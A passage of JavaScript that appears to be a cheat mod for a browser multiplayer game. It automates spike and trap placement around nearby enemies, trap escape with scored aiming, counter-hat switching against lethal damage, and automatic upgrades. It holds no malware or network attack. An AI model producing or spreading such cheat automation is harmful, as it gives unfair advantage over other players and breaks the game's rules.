      this.gpRecent.push({
        x,
        y,
        s: s + 2,
        id: itemId,
        t: game.tick || 0,
        ms: Date.now(),
      });
      if (this.gpRecent.length > 70) this.gpRecent.splice(0, this.gpRecent.length - 50);
    },

    autoPlace() {
      if (!enemy.length || !near || instaC.ticking || traps.inTrap) return;

      const PI = Math.PI;
      const PI2 = PI * 2;
      const { cos, sin, acos } = Math;

      const trapSlot = Array.isArray(player.items) ? player.items.findIndex((v) => v === 15) : -1;
      let spikeSlot = -1;
      if (Array.isArray(player.items)) {
        const spikePriorities = [9, 8, 7, 6];
        for (let i = 0; i < spikePriorities.length; i++) {
          const idx = player.items.indexOf(spikePriorities[i]);
          if (idx !== -1) { spikeSlot = idx; break; }
        }
      }
      if (trapSlot === -1 && spikeSlot === -1) return;

      if (!this.preplaces) this.preplaces = this.rbPreplaces || [[], []];
      if (!this.preplaces[0] || !this.preplaces[1]) this.preplaces = [[], []];
      this.preplaces[0].length = 0;
      this.preplaces[1].length = 0;
      this.rbPreplaces = this.preplaces;
      let didPlaceSpike = false;

      const nearObjects = [];
      for (let i = 0; i < liztobj.length; i++) {
        const o = liztobj[i];
        if (!o || !o.active) continue;
        if (UTILS.getDist(o, player, 0, 2) <= 420) nearObjects.push(o);
      }

      const riverMid = config.mapScale / 2;
      const riverMin = riverMid - config.riverWidth / 2;
      const riverMax = riverMid + config.riverWidth / 2;

      const createObj = (item, direct) => {
        const preObj = {
          id: item.id,
          dir: direct,
          scale: item.scale,
          colDiv: item.colDiv,
          getScale: function (sM, ig) {
            return this.scale * (ig ? 1 : this.colDiv);
          },
        };
        const tmpS = player.scale + preObj.scale + (item.placeOffset || 0);
        preObj.x = player.x2 + tmpS * cos(preObj.dir);
        preObj.y = player.y2 + tmpS * sin(preObj.dir);
        return preObj;
      };

      const overlaps = (arr, p) =>
        arr && arr.length ? arr.some((pos) => Math.hypot(pos.x - p.x, pos.y - p.y) < pos.scale + p.scale) : false;

      const canPlaceHere = (p) => {
        if (p.id !== 18 && p.y >= riverMin && p.y <= riverMax) return false;
        return objectManager.checkItemLocation(p.x, p.y, p.scale, 0.6, p.id, false, player);
      };

      const radCalc = (obj, direct, item, strict) => {
        let preObj = createObj(item, direct);
        const objScale = (typeof obj.getScale === "function" ? obj.getScale(0.6, obj.isItem) : obj.scale) + 0.01;
        const dist = Math.hypot(obj.x - preObj.x, obj.y - preObj.y);
        const scale = objScale + preObj.scale;
        const angles = [];

        if (dist < scale) {
          const calc = acos(dist / scale);
          const sum = [calc, -calc];
          for (let i = 0; i < sum.length; i++) {
            const angle = direct + sum[i];
            preObj = createObj(item, angle);
            if (overlaps(this.preplaces[1], preObj)) continue;
            if (overlaps(this.preplaces[0], preObj)) continue;
            if (canPlaceHere(preObj)) {
              angles.push(angle);
              this.preplaces[1].push(preObj);
            }
          }
        } else {
          if (strict) return [];
          preObj = createObj(item, direct);
          if (overlaps(this.preplaces[1], preObj)) return [];
          if (overlaps(this.preplaces[0], preObj)) return [];
          if (canPlaceHere(preObj)) {
            angles.push(direct);
            this.preplaces[1].push(preObj);
          }
        }

        return angles;
      };

      const autoPlaceCore = (type, id, id2, reason) => {
        if (id == null || player.items?.[id] == null) return;
        const item = items.list[player.items[id]];
        if (!item) return;

        const item2 = id2 != null && player.items?.[id2] != null ? items.list[player.items[id2]] : null;

        if (type === 0) {
          const radObjs = nearObjects;
          if (radObjs.length) {
            for (let i = 0; i < radObjs.length; i++) {
              const obj = radObjs[i];
              const direct = UTILS.getDirect(obj, player, 0, 2);
              let placeAngles = radCalc(obj, direct, item, false);
              if (placeAngles.length) {
                for (let k = 0; k < placeAngles.length; k++) place(id, placeAngles[k], 1);
                if (item.dmg) didPlaceSpike = true;
              } else if (item2) {
                placeAngles = radCalc(obj, direct, item2, false);
                if (placeAngles.length) {
                  for (let k = 0; k < placeAngles.length; k++) place(id2, placeAngles[k], 1);
                  if (item2.dmg) didPlaceSpike = true;
                }
              }
            }
          } else {
            for (let i = 0; i < PI2; i += PI / 2) checkPlace(id, near.aim2 + i);
          }
          return;
        }

        if (type === 1) {
          const wantTrap = !!item.trap;
          const radObjs = nearObjects.filter((obj) => {
            if (typeof obj.isTeamObject !== "function" || !obj.isTeamObject(player)) return false;
            if (wantTrap ? !obj.dmg : !obj.trap) return false;
            return UTILS.getDist(obj, near, 0, 2) < 500;
          });

          if (radObjs.length) {
            for (let i = 0; i < radObjs.length; i++) {
              const obj = radObjs[i];
              const direct = UTILS.getDirect(obj, player, 0, 2);
              const placeAngles = radCalc(obj, direct, item, true);
              if (placeAngles.length) {
                for (let k = 0; k < placeAngles.length; k++) place(id, placeAngles[k], 1);
                if (item.dmg) didPlaceSpike = true;
              }
            }
          }

          if (reason) {
            autoPlaceCore(type, id2, id, false);
          } else if (this.preplaces[1].length < 1) {
            autoPlaceCore(0, id2, id);
          }
        }
      };

      const dist2 = near.dist2 ?? UTILS.getDist(player, near, 0, 2);
      if (my.autoPush) {
        if (dist2 <= 169) autoPlaceCore(0, spikeSlot, trapSlot);
        else if (dist2 > 222) autoPlaceCore(0, trapSlot, spikeSlot);
      } else {
        if (dist2 <= 222) {
          if (near.inTrap) autoPlaceCore(0, spikeSlot, trapSlot);
          else if (near.escaped) autoPlaceCore(0, trapSlot, spikeSlot);
          else autoPlaceCore(1, spikeSlot, trapSlot, true);
        } else {
          if (dist2 > 269 && dist2 < 400) autoPlaceCore(0, trapSlot, spikeSlot);
          else if (dist2 <= 269) autoPlaceCore(1, trapSlot, spikeSlot, true);
        }
      }

      if (
        didPlaceSpike &&
        configs.SpikeTick &&
        !instaC.isTrue &&
        near &&
        typeof near.dist2 === "number"
      ) {
        const w0 = player?.weapons?.[0];
        const wRange = w0 != null ? (items.weapons?.[w0]?.range || 0) : 0;
        if (near.dist2 <= wRange + (player.scale || 0) * 1.8 + 10) {
          instaC.canSpikeTick = true;
        }
      }
    },

    checkSpikeTick() {
      try {
        if (![3, 4, 5].includes(near.primaryIndex)) return false;
        if (
          my.autoPush
            ? false
            : near.primaryIndex == undefined
              ? true
              : near.reloads[near.primaryIndex] > game.tickRate
        )
          return false;
        if (
          near.dist2 <=
          items.weapons[near.primaryIndex || 5].range + near.scale * 1.8
        ) {
          let item = items.list[9];
          let tmpS = near.scale + item.scale + (item.placeOffset || 0);
          let danger = 0;
          let counts = {
            attempts: 0,
            block: `unblocked`,
          };
          for (let i = -1; i <= 1; i += 1 / 10) {
            counts.attempts++;
            let relAim = UTILS.getDirect(player, near, 2, 2) + i;
            let tmpX = near.x2 + tmpS * Math.cos(relAim);
            let tmpY = near.y2 + tmpS * Math.sin(relAim);
            let cantPlace = liztobj.find(
              (tmp) =>
                tmp.active &&
                UTILS.getDistance(tmpX, tmpY, tmp.x, tmp.y) <
                item.scale +
                (tmp.blocker ? tmp.blocker : tmp.getScale(0.6, tmp.isItem)),
            );
            if (cantPlace) continue;
            if (
              tmpY >= config.mapScale / 2 - config.riverWidth / 2 &&
              tmpY <= config.mapScale / 2 + config.riverWidth / 2
            )
              continue;
            danger++;
            counts.block = `blocked`;
            break;
          }
          if (danger && near.dist2 <= 300) {
            my.anti0Tick = 1;
            healer();
            return true;
          }
        }
      } catch (err) {
        return null;
      }
      return false;
    },

    replacer(findObj) {
      if (!findObj || !near || !player || !player.alive) return;
      const objDist = UTILS.getDist(findObj, player, 0, 2);
      const objAim = UTILS.getDirect(findObj, player, 0, 2);
      const isEnemyTrap = findObj.trap && !findObj.isTeamObject(player);
      if (isEnemyTrap && traps.justOutTrap) {
        traps.lastBrokenObj = findObj;
        if (player.y2 >= config.mapScale - config.snowBiomeTop) buyEquip(22, 0);
        else buyEquip(6, 21);
        this.testCanPlace(2);
        return;
      }
      if (objDist <= 300 && near && near.dist2 <= 400) {
        const danger = traps.checkSpikeTick();
        const useTraps = danger && player.items[4] === 15 && near.dist2 > 200;
        if (useTraps) {
          this.testCanPlace(4, 0, Math.PI * 2, Math.PI / 18, objAim, true);
        } else {
          this.testCanPlace(2);
        }
        traps.replaced = true;
      }
    }
  },

  Heal: {
    healer() {
      healer();
    },

    healer33() {
      healer33();
    },

    healer1() {
      healer1();
    },

    noshameheal() {
      noshameheal();
    },

    antiSyncHealing() {
      antiSyncHealing();
    },

    healthBased() {
      return healthBased();
    },
  },

  Weapon: {
    selectWeapon(id, isAlt) {
      selectWeapon(id, isAlt);
    },

    buyEquip(id, index) {
      buyEquip(id, index);
    },

    storeEquip(id, index) {
      storeEquip(id, index);
    },

    storeBuy(id, index) {
      storeBuy(id, index);
    },
  },

  Upgrade: {
    sendUpgrade(index) {
      sendUpgrade(index);
    },
  },

  Movement: {
    getMoveDir() {
      return getMoveDir();
    },

    getSafeDir() {
      return getSafeDir();
    },

    getVisualDir() {
      return getVisualDir();
    },

    autoPush() {
      autoPush();
    },
  },

  Mouse: {
    mouseCoord() {
      return mouseCoord();
    },

    mouseWorldPos() {
      return mouseWorldPos();
    },

    mouseAimAngle() {
      return mouseAimAngle();
    },
  },

  Trap: {
    antiTrap() {
      if (typeof Mod.Place.antiTrap === "function") return Mod.Place.antiTrap();
    },
  },

  AutoBreak: {
    enabled: false,
    _aim: null,
    _active: false,
    _outTrapTimeout: null,
    _afterTrapTimeout: null,
    _lastInTrapTick: 0,
    _lastTrapSid: null,

    isSpike(name) {
      return (
        name === "spikes" ||
        name === "greater spikes" ||
        name === "spinning spikes" ||
        name === "poison spikes"
      );
    },

    isTrap(name) {
      return name === "pit trap" || name === "boost pad";
    },

    isWindmill(name) {
      return (
        name === "windmill" ||
        name === "faster windmill" ||
        name === "power mill"
      );
    },

    isTurret(name) {
      return name === "turret";
    },

    isTeleporter(name) {
      return name === "teleporter";
    },

    isBlocker(name) {
      return name === "blocker";
    },

    isWall(name) {
      return (
        name === "wood wall" || name === "stone wall" || name === "castle wall"
      );
    },

    isBreakable(name) {
      if (this.isSpike(name) && AB.Menu.Spike) return true;
      if (this.isTrap(name) && AB.Menu.Trap) return true;
      if (this.isWindmill(name) && AB.Menu.Windmill) return true;
      if (this.isTurret(name) && AB.Menu.Turret) return true;
      if (this.isTeleporter(name) && AB.Menu.Teleporter) return true;
      if (this.isBlocker(name) && AB.Menu.Blocker) return true;
      if (this.isWall(name) && AB.Menu.Wall) return true;
      return false;
    },

    getObjects(weaponRange) {
      if (!player || !gameObjects) return { enemy: [], own: [] };
      const enemy = [];
      const own = [];
      const gatherAngle = config.gatherAngle || Math.PI / 3;

      for (let i = 0; i < gameObjects.length; i++) {
        const obj = gameObjects[i];
        if (!obj || !obj.active) continue;

        const dist = Math.hypot(obj.x - player.x2, obj.y - player.y2);
        if (dist > weaponRange) continue;

        const angle = Math.atan2(obj.y - player.y2, obj.x - player.x2);
        const isOwn = obj.isTeamObject
          ? obj.isTeamObject(player)
          : obj.owner && obj.owner.sid === player.sid;

        if (isOwn) {
          own.push({ obj, dist, angle, scale: obj.scale });
        } else if (this.isBreakable(obj.name)) {
          let priority = 1;
          if (this.isSpike(obj.name)) priority = 5;
          if (this.isTrap(obj.name)) priority = 25;
          if (traps.info && obj.sid === traps.info.sid) priority = 20;
          if (obj.name === "pit trap") priority = 25;
          if (
            AB.Menu.BreakSpikeIntrap &&
            traps.inTrap &&
            this.isSpike(obj.name)
          ) {
            const weaponRange = items.weapons[player.weaponIndex]?.range || 0;
            if (dist <= weaponRange) {
              priority = 30;
            }
          }
          enemy.push({ obj, dist, angle, scale: obj.scale, priority });
        }
      }

      if (traps.info && traps.info.x !== undefined) {
        const trapDist = Math.hypot(
          traps.info.x - player.x2,
          traps.info.y - player.y2,
        );
        if (trapDist <= weaponRange) {
          const exists = enemy.some((e) => e.obj.sid === traps.info.sid);
          if (!exists) {
            enemy.push({
              obj: traps.info,
              dist: trapDist,
              angle: Math.atan2(
                traps.info.y - player.y2,
                traps.info.x - player.x2,
              ),
              scale: traps.info.scale,
              priority: 25,
            });
          }
        }
      }

      return { enemy, own };
    },

    scoreAngle(testAngle, enemy, own, weaponRange, gatherAngle) {
      let score = 0;
      let enemyHits = 0;
      let ownHits = 0;
      let trapHit = false;
      const halfGather = gatherAngle / 2;

      for (const e of enemy) {
        let angleDiff = Math.abs(testAngle - e.angle);
        if (angleDiff > Math.PI) angleDiff = Math.PI * 2 - angleDiff;
        if (angleDiff <= halfGather) {
          score += e.priority;
          enemyHits++;
          if (e.priority >= 20) trapHit = true;
        }
      }

      for (const o of own) {
        let angleDiff = Math.abs(testAngle - o.angle);
        if (angleDiff > Math.PI) angleDiff = Math.PI * 2 - angleDiff;
        if (angleDiff <= halfGather) {
          score -= 15;
          ownHits++;
        }
      }

      if (traps.info && !trapHit) {
        score -= 10;
      }

      return { score, enemyHits, ownHits, trapHit };
    },

    calculateBestAngle(enemy, own, weaponRange) {
      if (!player || enemy.length === 0) return null;

      const gatherAngle = config.gatherAngle || Math.PI / 3;
      const angleSteps = 72;
      let bestAngle = null;
      let bestScore = -Infinity;
      let bestEnemyHits = 0;

      const trapTarget = enemy.find((e) => e.priority >= 20);
      if (trapTarget) {
        const result = this.scoreAngle(
          trapTarget.angle,
          enemy,
          own,
          weaponRange,
          gatherAngle,
        );
        if (result.ownHits === 0) {
          bestAngle = trapTarget.angle;
          bestScore = result.score;
          bestEnemyHits = result.enemyHits;
        }
      }

      for (const e of enemy) {
        const result = this.scoreAngle(
          e.angle,
          enemy,
          own,
          weaponRange,
          gatherAngle,
        );
        if (
          result.score > bestScore ||
          (result.score === bestScore && result.enemyHits > bestEnemyHits)
        ) {
          bestAngle = e.angle;
          bestScore = result.score;
          bestEnemyHits = result.enemyHits;
        }
      }

      for (let i = 0; i < angleSteps; i++) {
        const testAngle = (i * 2 * Math.PI) / angleSteps;
        const result = this.scoreAngle(
          testAngle,
          enemy,
          own,
          weaponRange,
          gatherAngle,
        );
        if (
          result.score > bestScore ||
          (result.score === bestScore && result.enemyHits > bestEnemyHits)
        ) {
          bestAngle = testAngle;
          bestScore = result.score;
          bestEnemyHits = result.enemyHits;
        }
      }

      return bestAngle;
    },

    getBreakWeapon() {
      if (!player || !traps) return player?.weapons[0];
      return traps.notFast() ? player.weapons[1] : player.weapons[0];
    },

    getAim() {
      return this._active ? this._aim : null;
    },

    run() {
      if (!player || !traps.inTrap) {
        this._active = false;
        this._aim = null;
        return false;
      }

      this._lastInTrapTick = game.tick || 0;
      if (traps.info && traps.info.sid != null) this._lastTrapSid = traps.info.sid;

      if (clicks.left || clicks.right || instaC.isTrue) {
        return false;
      }

      this._active = true;
      const breakWeapon = this.getBreakWeapon();
      const weaponRange = items.weapons[breakWeapon]?.range || 0;
      const { enemy, own } = this.getObjects(weaponRange);

      const bestAngle = this.calculateBestAngle(enemy, own, weaponRange);

      if (bestAngle !== null) {
        this._aim = bestAngle;
        traps.aim = bestAngle;
      } else if (traps.info && traps.info.x !== undefined) {
        this._aim = Math.atan2(
          traps.info.y - player.y2,
          traps.info.x - player.x2,
        );
        traps.aim = this._aim;
      }

      if (player.weaponIndex !== breakWeapon || player.buildIndex > -1) {
        selectWeapon(breakWeapon);
      }

      if (player.reloads[breakWeapon] === 0 && !my.waitHit) {
        buyEquip(40, 19);
        sendAutoGather();
        my.waitHit = 1;
        game.tickBase(() => {
          sendAutoGather();
          my.waitHit = 0;
        }, 1);
      }

      return true;
    },

    checkBreak() {
      if (!this.enabled || !player) return;
      this.run();
    },

    getSmartPlaceAngles(amount = 16) {
      const PI = Math.PI;
      const PI2 = PI * 2;
      const result = { spike: [], trap: [], onEnemy: [] };
      if (!player) return result;

      const spikeId = player.items[2];
      const trapId = player.items[4];
      const spikeItem = spikeId != null ? items.list[spikeId] : null;
      const trapItem = trapId != null ? items.list[trapId] : null;

      if (!spikeItem && !trapItem) return result;

      const riverMin = config.mapScale / 2 - config.riverWidth / 2;
      const riverMax = config.mapScale / 2 + config.riverWidth / 2;

      const nearObjects = liztobj.filter(
        (e) => e.active && UTILS.getDistance(e, player, 0, 2) <= 400,
      );

      const closestPossibleAngles = (obj, item) => {
        const objScale =
          (obj.getScale ? obj.getScale(0.6, obj.isItem) : obj.scale) + 0.6;
        const dx = obj.x - player.x2;
        const dy = obj.y - player.y2;
        const dist = Math.sqrt(dx * dx + dy * dy);
        const D = player.scale + item.scale + (item.placeOffset || 0);
        const E = objScale + item.scale;

        if (dist > D + E) {
          return [Math.atan2(dy, dx)];
        }

        const a = (D * D - E * E + dist * dist) / (2 * dist);
        const h = Math.sqrt(Math.max(0, D * D - a * a));
        const px = player.x2 + (a / dist) * dx;
        const py = player.y2 + (a / dist) * dy;

        return [
          Math.atan2(
            py - (h / dist) * dx - player.y2,
            px + (h / dist) * dy - player.x2,
          ),
          Math.atan2(
            py + (h / dist) * dx - player.y2,
            px - (h / dist) * dy - player.x2,
          ),
        ];
      };

      const canPlaceAt = (x, y, itemScale, itemId, placedObjs) => {
        if (itemId !== 18 && y >= riverMin && y <= riverMax) return false;
        if (
          !objectManager.checkItemLocation(
            x,
            y,
            itemScale,
            0.6,
            0,
            false,
            player,
            null,
          )
        )
          return false;
        for (let i = 0; i < liztobj.length; i++) {
          const o = liztobj[i];
          if (!o.active) continue;
          const dx = x - o.x,
            dy = y - o.y;
          const objScale =
            o.blocker ||
            (o.getScale ? o.getScale(0.6, o.isItem) : o.scale * 0.6);
          const minDist = itemScale + objScale;
          if (dx * dx + dy * dy < minDist * minDist) return false;
        }
        for (const placed of placedObjs) {
          const dx = x - placed.x,
            dy = y - placed.y;
          const minDist = itemScale + placed.scale;
          if (dx * dx + dy * dy < minDist * minDist) return false;
        }
        return true;
      };

      const adjustAngle = (baseAngle, item) => {
        let angle = baseAngle;
        const angleStep = PI2 / amount;

        for (const obj of nearObjects) {
          const extraAngles = closestPossibleAngles(obj, item);
          if (!extraAngles || extraAngles.length === 0) continue;

          let best = extraAngles[0];
          if (extraAngles.length > 1) {
            const d0 = Math.abs(UTILS.getAngleDist(baseAngle, extraAngles[0]));
            const d1 = Math.abs(UTILS.getAngleDist(baseAngle, extraAngles[1]));
            best = d1 < d0 ? extraAngles[1] : extraAngles[0];
          }

          if (Math.abs(UTILS.getAngleDist(baseAngle, best)) < angleStep * 0.6) {
            angle = best;
            break;
          }
        }
        return angle;
      };

      const enemyAngle = near ? near.aim2 : 0;
      const hasEnemy = near && near.dist2 < 500;
      const spikeAngleThreshold = PI / 3;

      const placedObjects = [];

      if (hasEnemy && spikeItem && near.dist2 < 200) {
        const spikeScale =
          player.scale + spikeItem.scale + (spikeItem.placeOffset || 0);
        const maxPlaceDist = spikeScale + near.scale + spikeItem.scale;

        if (near.dist2 <= maxPlaceDist) {
          const angleToEnemy = UTILS.getDirect(near, player, 2, 2);
          const spikeAngles = [
            angleToEnemy,
            angleToEnemy + PI / 12,
            angleToEnemy - PI / 12,
          ];

          for (const sAngle of spikeAngles) {
            const sx = player.x2 + Math.cos(sAngle) * spikeScale;
            const sy = player.y2 + Math.sin(sAngle) * spikeScale;

            if (
              !canPlaceAt(sx, sy, spikeItem.scale, spikeItem.id, placedObjects)
            )
              continue;

            const distToEnemy = Math.hypot(sx - near.x2, sy - near.y2);
            if (distToEnemy <= near.scale + spikeItem.scale + 5) {
              placedObjects.push({ x: sx, y: sy, scale: spikeItem.scale });
              result.onEnemy.push(sAngle);
            }
          }
        }
      }

      for (let i = 0; i < amount; i++) {
        const baseAngle = i * (PI2 / amount);

        let angleDiff = hasEnemy ? Math.abs(baseAngle - enemyAngle) : PI;
        if (angleDiff > PI) angleDiff = PI2 - angleDiff;

        const useSpike =
          hasEnemy && angleDiff <= spikeAngleThreshold && spikeItem;
        const item = useSpike ? spikeItem : trapItem;

        if (!item) continue;

        const adjustedAngle = adjustAngle(baseAngle, item);
        const tmpScale = player.scale + item.scale + (item.placeOffset || 0);
        const x = player.x2 + Math.cos(adjustedAngle) * tmpScale;
        const y = player.y2 + Math.sin(adjustedAngle) * tmpScale;

        if (!canPlaceAt(x, y, item.scale, item.id, placedObjects)) continue;

        placedObjects.push({ x, y, scale: item.scale });

        if (useSpike) {
          result.spike.push(adjustedAngle);
        } else {
          result.trap.push(adjustedAngle);
        }
      }

      return result;
    },

    smartPlaceAll(amount = 16) {
      if (!player) return;
      const angles = this.getSmartPlaceAngles(amount);

      for (const angle of angles.onEnemy) {
        place(2, angle, 1);
      }
      for (const angle of angles.spike) {
        place(2, angle, 1);
      }
      for (const angle of angles.trap) {
        if (player.items[4] === 15) {
          place(4, angle, 1);
        }
      }
    },

    outtrap() {
      if (!player || !traps.justOutTrap) return;
      if (!AB.Menu.AutoBreak) return;

      textManager.showText(
        player.x,
        player.y,
        30,
        0.18,
        500,
        "OutTrap",
        "#ff6b6b",
      );

      this._active = false;
      this._aim = null;
      my.waitHit = 0;
      Hit.auto("off");
      Hit.attack("off");
      buyEquip(biomeGear(0), biomeGear(1));

      clearTimeout(this._outTrapTimeout);
      this._outTrapTimeout = setTimeout(() => {
        this.smartPlaceAll(16);
      }, 120);
    },

    aftertrap(obj) {
      if (!player || !obj || !obj.isItem) return;
      if (!AB.Menu.AutoBreak) return;

      const dist = Math.hypot(obj.x - player.x2, obj.y - player.y2);

      const recentTrap = (game.tick || 0) - (this._lastInTrapTick || 0) <= 8;

      if (recentTrap && this.isSpike(obj.name) && dist < 250) {
        this.smartPlaceAll(16);
        return;
      }

      const isEnemyTrap =
        obj.name === "pit trap" && obj.owner && obj.owner.sid !== player.sid;
      if (!isEnemyTrap) return;
      if (!recentTrap) return;
      if (this._lastTrapSid != null && obj.sid != null && obj.sid !== this._lastTrapSid) return;

      textManager.showText(
        player.x,
        player.y,
        30,
        0.18,
        500,
        "AfterTrap",
        "#ff6b6b",
      );

      this._active = false;
      this._aim = null;
      my.waitHit = 0;
      Hit.auto("off");
      Hit.attack("off");
      buyEquip(biomeGear(0), biomeGear(1));

      clearTimeout(this._afterTrapTimeout);
      this._afterTrapTimeout = setTimeout(() => {
        this.smartPlaceAll(16);
        if (
          configs.antiInsta &&
          near &&
          typeof near.dist2 === "number" &&
          near.dist2 <= 340 &&
          !instaC.isTrue
        ) {
          const pingMs =
            typeof window.pingTime === "number"
              ? window.pingTime
              : typeof window.ping === "number"
                ? window.ping
                : 0;
          const margin = Math.min(18, Math.max(6, pingMs / 12));
          const dmgNow = calcInstaDamage(near, player, false);
          const soldierDmg = calcInstaDamage(near, { ...player, skinIndex: 6 }, false);
          const empDmg = calcInstaDamage(near, { ...player, skinIndex: 22 }, false);
          const extraTrap = 15;
          const lethal = dmgNow + extraTrap >= player.health - margin;
          if (lethal) {
            const canEmp = near.skins?.[53] && near.reloads?.[53] == 0;
            let desiredHat = 6;
            if (canEmp && empDmg < soldierDmg) desiredHat = 22;
            player.empAnti = desiredHat === 22;
            player.soldierAnti = desiredHat === 6;
            player._antiGearUntilTick = (game.tick || 0) + 4;
            player.antiTimer = game.tick || 0;
            buyEquip(desiredHat, 0);
          }
        }
        if (
          configs.SpikeTick &&
          near &&
          typeof near.dist2 === "number" &&
          !instaC.isTrue &&
          [1, 2, 3, 4, 5, 6].includes(player.weapons[0]) &&
          player.reloads[player.weapons[0]] == 0
        ) {
          const wRange = items.weapons[player.weapons[0]]?.range || 0;
          if (near.dist2 <= wRange + (player.scale || 0) * 1.8 + 10) {
            instaC.spikeTickType();
          }
        }
      }, 120);
    },
  },
  Misc: {
    objs: [
      { name: "apple", id: 0 },
      { name: "cookie", id: 1 },
      { name: "cheese", id: 2 },
      { name: "wood wall", id: 3 },
      { name: "stone wall", id: 4 },
      { name: "castle wall", id: 5 },
      { name: "spikes", id: 6 },
      { name: "greater spikes", id: 7 },
      { name: "poison spikes", id: 8 },
      { name: "spinning spikes", id: 9 },
      { name: "windmill", id: 10 },
      { name: "faster windmill", id: 11 },
      { name: "power mill", id: 12 },
      { name: "mine", id: 13 },
      { name: "sapling", id: 14 },
      { name: "pit trap", id: 15 },
      { name: "boost pad", id: 16 },
      { name: "turret", id: 17 },
      { name: "platform", id: 18 },
      { name: "healing pad", id: 19 },
      { name: "spawn pad", id: 20 },
      { name: "blocker", id: 21 },
      { name: "teleporter", id: 22 },
    ],
    AutoUpgrade() {
      if (!AB.Menu.autoUpgrade || !player) return;

      const cfg =
        {
          KH: { Weapons: [3, 10, 4], items: [17, 31, 27, 38, 25] },
          PH: { Weapons: [5, 10], items: [17, 31, 23, 38, 28, 25] },
          DH: { Weapons: [7, 10], items: [17, 31, 23, 38, 28, 25] },
          BH: { Weapons: [6, 10], items: [17, 31, 23, 38, 28, 25] },
          SH: { Weapons: [8, 10], items: [17, 31, 23, 38, 28, 25] },
          SM: { Weapons: [3, 9, 12, 15], items: [17, 31, 23, 38] },
          PM: { Weapons: [5, 9, 12, 15], items: [17, 31, 23, 38] },
          DM: { Weapons: [7, 9, 12, 15], items: [17, 31, 23, 38] },
          PB: { Weapons: [5, 9], items: [17, 31, 23, 38] },
          PBC: { Weapons: [5, 10, 12, 13], items: [17, 31, 23, 38] },
        }[AB.Menu.UpgType] || {};

      const weaponIds = cfg.Weapons || [];
      const itemIds = cfg.items || [];
      weaponIds.forEach((id) => {
        const w = items?.weapons?.[id];
        if (w && w.age === player.upgrAge && player.upgradePoints)
          io.send("H", id);
      });

      itemIds.forEach((id) => {
        if (!player.items?.[id] && player.upgrAge < 10 && player.upgradePoints)
          io.send("H", id);
      });
    },

    autoBuy() {
      if (typeof buyEquip === "function") {
        buyEquip(0, 0);
      }
    },

    calculateDamage(weaponIndex, isPrimary) {
      if (!player || !player.weapons) return 0;
      const weapon = player.weapons[weaponIndex];
      if (!weapon) return 0;

      let baseDmg = weapon.dmg || 0;
      const skinMultiplier = 1;
      const tailMultiplier = 1;

      return baseDmg * skinMultiplier * tailMultiplier;
    },
  },

  Utils: {
    toRad: Math.PI / 180,

    getDistance(x1, y1, x2, y2) {
      const dx = x2 - x1;
      const dy = y2 - y1;
      return Math.sqrt(dx * dx + dy * dy);
    },

    getDirection(x1, y1, x2, y2) {
      return Math.atan2(y2 - y1, x2 - x1);
    },

    getAngleDist(a1, a2) {
      let diff = a1 - a2;
      if (diff > Math.PI) diff -= 2 * Math.PI;
      if (diff < -Math.PI) diff += 2 * Math.PI;
      return Math.abs(diff);
    },

    lerp(start, end, amt) {
      return start + (end - start) * amt;
    },
  },

  intrap: false,
  Enemyintrap: false,
  justOutTrap: false,
  currTr: null,
  isEnemyNear: false,
  Test: false,

  fgd(a, b) {
    if (!a || !b) return Infinity;
    if (Array.isArray(a)) a = { x: a[1] || a.x, y: a[2] || a.y };
    if (Array.isArray(b)) b = { x: b.x2 || b.x, y: b.y2 || b.y };
    return Math.hypot(
      (b.y2 || b.y) - (a.y || a[2]),
      (b.x2 || b.x) - (a.x || a[1]),
    );
  },

  fsd(a, b) {
    if (!a || !b) return Infinity;
    if (Array.isArray(a)) a = { x: a[1], y: a[2] };
    if (Array.isArray(b)) b = { x: b[1], y: b[2] };
    if (a.x == null || a.y == null || b.x == null || b.y == null)
      return Infinity;
    return Math.hypot(a.y - b.y, a.x - b.x);
  },

  Updates() {
    if (!player || !player.alive || !inGame) return;

    this.isEnemyNear = false;
    if (enemy && enemy.length) {
      enemy.sort((a, b) => this.fgd(a, player) - this.fgd(b, player));
      near = enemy[0];
      if (near && near.dist2 !== undefined) {
        this.isEnemyNear = near.dist2 < 300;
      }
    }

    this.EnemyTrapVisualUpdate();

    if (AB.Menu.AutoPlace && !traps.inTrap) {
      this.Place.autoPlace();
    }

    if (AB.Menu.AutoMill && !this.intrap) {
      this.Place.AutoMill();
    }

    if (AB.Menu.AutoBreak) {
      this.AutoBreak.checkBreak();
    }

    if (AB.Menu.autoPush && this.Movement.autoPush) {
      this.Movement.autoPush();
    }
  },

  EnemyTrapVisualUpdate() {
    if (!player || !gameObjects) return;

    const trap = gameObjects.find(
      (t) =>
        t.trap &&
        t.active &&
        !t.isTeamObject(player) &&
        UTILS.getDist(t, player, 0, 2) <= t.getScale() + player.scale,
    );

    if (!trap && this.currTr) {
      this.justOutTrap = true;
      setTimeout(() => (this.justOutTrap = false), 120);
    }
    this.currTr = trap;
    this.intrap = !!trap;

    // Update trap opacity for enemy-trapped traps
    const fadeSpeed = 0.08;
    gameObjects.forEach((t) => {
      if (!t.trap || !t.active || !t.isTeamObject(player)) return;

      // Initialize fade value
      if (t._trappedFade === undefined) t._trappedFade = 0;

      // Check if any enemy is in this trap
      const hasEnemy = enemy.some(
        (e) =>
          e &&
          e.alive &&
          e.visible &&
          UTILS.getDist(t, e, 0, 2) <= t.getScale() + e.scale,
      );

      t._enemyTrapped = hasEnemy;

      // Fade in/out
      if (hasEnemy) {
        t._trappedFade = Math.min(1, t._trappedFade + fadeSpeed);
      } else {
        t._trappedFade = Math.max(0, t._trappedFade - fadeSpeed);
      }
    });

    if (near && gameObjects) {
      const trap2 = gameObjects.find(
        (t) =>
          t.trap &&
          t.active &&
          t.isTeamObject(player) &&
          UTILS.getDist(t, near, 0, 2) <= t.getScale() + near.scale,
      );
      this.Enemyintrap = !!trap2;
    }
  },

  Test() {
    this.Combat.init();
    console.log("Mod initialized");
  },
  init() {
    setInterval(() => {
      Mod.Misc.AutoUpgrade();
    }, 500);
  },
};
Mod.init();
let player = Mod.player;
let playerSID = Mod.playerSID;
let tmpObj = Mod.tmpObj;
let enemy = Mod.enemy;
let nears = Mod.nears;
let near = Mod.near;
let bloodParticles = Mod.bloodParticles;
let damageAccumulator = Mod.damageAccumulator;

class BloodParticle {
  constructor(x, y, angle, speed, size, color) {
    this.x = x;
    this.y = y;
    this.vx = Math.cos(angle) * speed;
    this.vy = Math.sin(angle) * speed;
    this.size = size;
    this.maxSize = size;
    this.color = color;
    this.life = 1;
    this.decay = 0.015 + Math.random() * 0.015;
    this.gravity = 0.15;
    this.bounce = 0.3;
